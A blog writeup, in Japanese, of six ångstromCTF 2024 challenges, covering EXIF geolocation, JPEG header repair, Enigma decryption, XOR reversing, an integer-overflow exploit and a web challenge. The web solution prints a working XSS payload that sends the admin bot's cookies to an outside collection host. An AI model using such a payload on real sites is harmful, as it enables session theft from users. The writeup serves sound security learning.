@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>ångstromCTF 2024 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/angstromctf_2024/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="ångstromCTF 2024 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2024/" />
+<meta property="article:published_time" content="2024-06-01T13:00:00+09:00" />
+<meta property="article:modified_time" content="2024-06-01T13:00:00+09:00" />
+<meta itemprop="name" content="ångstromCTF 2024 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50">
+<meta itemprop="datePublished" content="2024-06-01T13:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2024-06-01T13:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="2026">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ångstromCTF 2024 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2024.angstromctf.com/challenges ångstromCTF は、5回目の参加です。 ångstromCTF 2020 (491位) ångstromCTF 2021 (50"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">ångstromCTF 2024 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2024-06-01 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc-trip-30-points">[Misc]: Trip (30 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-do-you-wanna-build-a-snowman-50-points">[Misc]: do you wanna build a snowman (50 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-erm-what-the-enigma-20-points">[Crypto]: erm what the enigma (20 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev-guess-the-flag-20-points">[Rev]: Guess the Flag (20 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-exam-50-points">[Pwn]: exam (50 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-markdown-80-points">[Web]: markdown (80 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fangstromctf_2024%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://2024.angstromctf.com/challenges">https://2024.angstromctf.com/challenges</a>
+<br /><br /></p>
+<p>ångstromCTF は、5回目の参加です。</p>
+<p><a href="https://captureamerica.github.io/writeups/post/angstromctf_2020/">ångstromCTF 2020</a> (491位)</p>
+<p><a href="https://captureamerica.github.io/writeups/post/angstromctf_2021/">ångstromCTF 2021</a> (500位)</p>
+<p><a href="https://captureamerica.github.io/writeups/post/angstromctf_2022/">ångstromCTF 2022</a> (814位)</p>
+<p><a href="https://captureamerica.github.io/writeups/post/angstromctf_2023/">ångstromCTF 2023</a> (314位)</p>
+<br>
+今回は、190点を獲得し、順位は437位でした。<br />
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_score.png" alt="angstromctf_2024_score.png">
+<p><br /></p>
+<p>以下は解いたチャレンジです。<br />
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_solves.png" alt="angstromctf_2024_solves.png"></p>
+<p><br /></p>
+<p>チャレンジ一覧:</p>
+<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_chall1.png" alt="angstromctf_2024_chall1.png"><br></p>
+<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_chall2.png" alt="angstromctf_2024_chall2.png"><br></p>
+<br>
+<p>あまり解けていませんが、参加した記念として、ブログを残しておきます。</p>
+<p><br /><br /></p>
+<h2 id="misc-trip-30-points">[Misc]: Trip (30 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>What road was this this photo (trip.jpeg) taken on?
+<br /><br />
+For example, if the road was &ldquo;Colesville Road&rdquo; the flag would be actf{colesville}.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>写真に写っている景色を見ても場所は特定できなさそうだったので、exifのlocationだと予想。</p>
+<pre>
+:
+(snip)
+:
+GPS Latitude                    : 37 deg 56' 23.60" N
+GPS Longitude                   : 75 deg 26' 17.11" W
+Circle Of Confusion             : 0.008 mm
+Field Of View                   : 73.7 deg
+Focal Length                    : 6.8 mm (35 mm equivalent: 24.0 mm)
+GPS Position                    : 37 deg 56' 23.60" N, 75 deg 26' 17.11" W
+Hyperfocal Distance             : 3.04 m
+Light Value                     : 3.4
+</pre>
+<p><br />
+以下のフォーマットでGoogleでサーチしてもダメだったので、</p>
+<pre>
+37 deg 56' 23.60" N, 75 deg 26' 17.11" W
+</pre>
+<p><br />
+以下のように変更してからGoogleでサーチ。</p>
+<pre>
+37°56'23.60"N, 75°26'17.11"W
+</pre>
+<p><br /></p>
+<p>Flag: <code>actf{chincoteague}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-do-you-wanna-build-a-snowman-50-points">[Misc]: do you wanna build a snowman (50 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Anna: Do you wanna build a snowman? Elsa: Sure if you can open my snowman picture (snowman.jpg)</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>ヘッダ修復系だと思いつつ、「ヘッダ合っているしなぁ」と思って、大会中に解けなかったやつです。</p>
+<p>JPGのヘッダは、&ldquo;ffd8 ffe0&quot;が正解でしたね。</p>
+<pre>
+$ xxd snowman.jpg | head
+00000000: fdd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
+:
+(snip)
+:
+</pre>
+<p><br /></p>
+<p>手元にあった別のjpgとも比較してたんですが。。。（メモより）</p>
+<pre>
+$ xxd ~/Pictures/IMG-20230420-WA0049.jpg | head
+00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
+:
+(snip)
+:
+</pre>
+<p><br /></p>
+<p>目医者に行ってきます〜（笑）</p>
+<p><br /></p>
+<p>以下で書き換えできます。</p>
+<pre>
+printf '\xff' | dd of=snowman.jpg bs=1 seek=0 count=1 conv=notrunc
+</pre>
+<p><br /></p>
+<p>Flag: <code>actf{built_the_snowman}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="crypto-erm-what-the-enigma-20-points">[Crypto]: erm what the enigma (20 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>In the dimly lit, smoke-filled war room, the Enigma M3 machine sat at the center of the table like a cryptographic sentinel. Its reflector, UKW B, gleamed ominously in the low light. The three rotors, I, II, and III, stood proudly in their respective slots, each at position 1 with their rings set to 1. The plugboard, conspicuously vacant, indicated a reliance on the rotor settings alone to encode the day&rsquo;s crucial messages. As the operator&rsquo;s fingers hovered over the keys, the silence was heavy with anticipation. Each clack of the keys transformed plaintext into an unbreakable cipher, the resulting ciphertext, brht{d_imhw_cexhrmwyy_lbvkvqcf_ldcz}, a guardian of wartime secrets.
+<br /><br /></p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>いろいろエニグマの設定情報が書かれていますが、CyberChefのデフォルト設定で解けます。</p>
+<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_2024_enigma.png" alt="angstromctf_2024_enigma.png"><br></p>
+<p><br /></p>
+<p>Flag: <code>actf{i_love_enigmatic_machines_mwah}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="rev-guess-the-flag-20-points">[Rev]: Guess the Flag (20 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Do you have what it takes to guess the flag? Find out here!</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>guess_the_flag (ELF 64bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>タイトルからして、テキトーにGuessしたらフラグがわかるのかな？と思ったんですが、普通にGhidraでReverse Engineeringする必要がある気がします。</p>
+<p><br />
+Ghidraで見たら、secretcode にある文字列を 1 で XOR しているのがわかります。</p>
+<p>いろんな解き方があると思いますが、gdbでstrcmp()のところにbreak pointをしかけて、あとはCyberChefのXORを使って解きました。</p>
+<pre>
+strcmp@plt (
+   $rdi = 0x00007fffffffe0e0 → "10325476981032547698103254769810325476981032547698[...]",
+   $rsi = 0x0000555555558020 → "`bugzbnllhuude^un^uid^md`ru^rhfohghb`ou^chu|",
+   $rdx = 0x00007fffffffe0e0 → "10325476981032547698103254769810325476981032547698[...]",
+   $rcx = 0x0000000000000000,
+   $r8 = 0x000000000000003e
+)
+</pre>
+<p><br /></p>
+<p>Flag: <code>actf{committed_to_the_least_significant_bit}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-exam-50-points">[Pwn]: exam (50 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>I thought my tiring AP season was over, but I heard that they&rsquo;re offering a flag in AP Cybersecurity! The proctor seems to have trust issues though&hellip;
+<br /><br />
+nc challs.actf.co 31322</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>exam (ELF 64bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>Pwnカテゴリですが、どっちかっていうと、Revカテゴリのチャレンジな気がします。</p>
+<p>Ghidraでソースを確認します。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="hl"><span class="lnt">14
+</span></span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="hl"><span class="lnt">20
+</span></span><span class="hl"><span class="lnt">21
+</span></span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="hl"><span class="lnt">27
+</span></span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="hl"><span class="lnt">33
+</span></span><span class="hl"><span class="lnt">34
+</span></span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="hl"><span class="lnt">37
+</span></span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_e8</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">local_a8</span> <span class="p">[</span><span class="mi">152</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;How much should I not trust you? &gt;:)</span><span class="se">\n</span><span class="s">: &#34;</span><span class="p">);</span>
+<span class="hl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020e0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">detrust</span><span class="p">);</span>
+</span>  <span class="n">fgets</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">detrust</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Don</span><span class="se">\&#39;</span><span class="s">t try to trick me into trusting you &gt;:(&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+<span class="hl">    <span class="n">trust_level</span> <span class="o">=</span> <span class="n">trust_level</span> <span class="o">-</span> <span class="n">detrust</span><span class="p">;</span>
+</span><span class="hl">    <span class="k">if</span> <span class="p">(</span><span class="n">trust_level</span> <span class="o">==</span> <span class="mh">0x7ffffffe</span><span class="p">)</span> <span class="p">{</span>
+</span>      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What kind of cheating are you doing?&#34;</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You haven</span><span class="se">\&#39;</span><span class="s">t even signed your statement yet!&#34;</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You are BANNED from all future AP exams!!!&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+<span class="hl">      <span class="k">while</span> <span class="p">(</span><span class="n">trust_level</span> <span class="o">&lt;</span> <span class="mh">0x7ffffffe</span><span class="p">)</span> <span class="p">{</span>
+</span>        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">I don</span><span class="se">\&#39;</span><span class="s">t trust you enough &gt;:)&#34;</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span>
+              <span class="s">&#34;Prove your trustworthyness by reciting the statement on the front cover of the Sectio n I booklet &gt;:)</span><span class="se">\n</span><span class="s">: &#34;</span>
+              <span class="p">);</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+<span class="hl">        <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span>
+</span><span class="hl">                       <span class="s">&#34;I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/20 24. I will not disclose any information about any section of this exam.</span><span class="se">\n</span><span class="s">&#34;</span>
+</span>                      <span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+<span class="hl">          <span class="n">trust_level</span> <span class="o">=</span> <span class="n">trust_level</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span>        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="n">__stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+      <span class="n">fgets</span><span class="p">(</span><span class="n">local_e8</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">You will now take the multiple-choice portion of the exam.&#34;</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You should have in front of you the multiple-choice booklet and your answer sheet. &#34;</span><span class="p">);</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You will have %s minutes for this section. Open your Section I booklet and begin.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+             <span class="n">local_e8</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+<code>trust_level</code>はglobal変数で0初期化されています。</p>
+<p><code>trust_level</code>から、scanf()で取得する入力値<code>detrust</code>の値を引いた値が条件に当てはまるようにします。</p>
+<p>私は、2147483647 を使いました。</p>
+<pre>
+$ python3
+>>> 0x7fffffff
+2147483647
+</pre>
+<p><br />
+あとは、strcmp()をしているところを2回通過し <code>trust_level</code> の値がしきい値を超えると、while() ループを抜けてフラグが表示されます。</p>
+<p><br />
+余談ですが、Ghidraのソースコードをコピペした際に、<code>5/27/20 24</code>のように余分なスペースが入ってしまっていたので、strcmp()で全然マッチせず小一時間悩みました。。。</p>
+<p><br />
+以下が実行結果です。</p>
+<pre>
+$ nc challs.actf.co 31322
+How much should I not trust you? >:)
+: 2147483647
+
+I don't trust you enough >:)
+Prove your trustworthyness by reciting the statement on the front cover of the Section I booklet >:)
+: I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.
+
+I don't trust you enough >:)
+Prove your trustworthyness by reciting the statement on the front cover of the Section I booklet >:)
+: I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.
+
+You will now take the multiple-choice portion of the exam.
+You should have in front of you the multiple-choice booklet and your answer sheet.
+You will have actf{manifesting_those_fives} minutes for this section. Open your Section I booklet and begin.
+</pre>
+<p><br /></p>
+<p>Flag: <code>actf{manifesting_those_fives}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-markdown-80-points">[Web]: markdown (80 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>My friend made an app for sharing their notes!
+<br /><br />
+App: <a href="https://markdown.web.actf.co/">https://markdown.web.actf.co/</a>
+<br /><br />
+Send them a link: <a href="https://admin-bot.actf.co/markdown">https://admin-bot.actf.co/markdown</a></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>index.js</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-5">Solution</h3>
+<p>以下の手順で解きました。</p>
+<ol>
+<li>
+<p>Mark Downの方で、cookieを取るスクリプトを書く。</p>
+</li>
+<li>
+<p>そのURLをAdmin Botに踏ませる。</p>
+</li>
+<li>
+<p>そのCookieを使って、https://markdown.web.actf.co/flag にアクセスする。</p>
+</li>
+</ol>
+<p><br /></p>
+<p>使ったコードは以下です。</p>
+<pre>
+&lt;img src=x onerror="(new Image).src='https://captureamerica.free.beeceptor.com/cool.jpg?'+document.cookie">
+</pre>
+<p><br /></p>
+<p>Flag: <code>actf{b534186fa8b28780b1fcd1e95e2a2e2c}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2024-06-01
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/kringlecon_2023/">
+            <span class="next-text nav-default">SANS Holiday Hack Challenge (Kringlecon) 2023 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2024<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
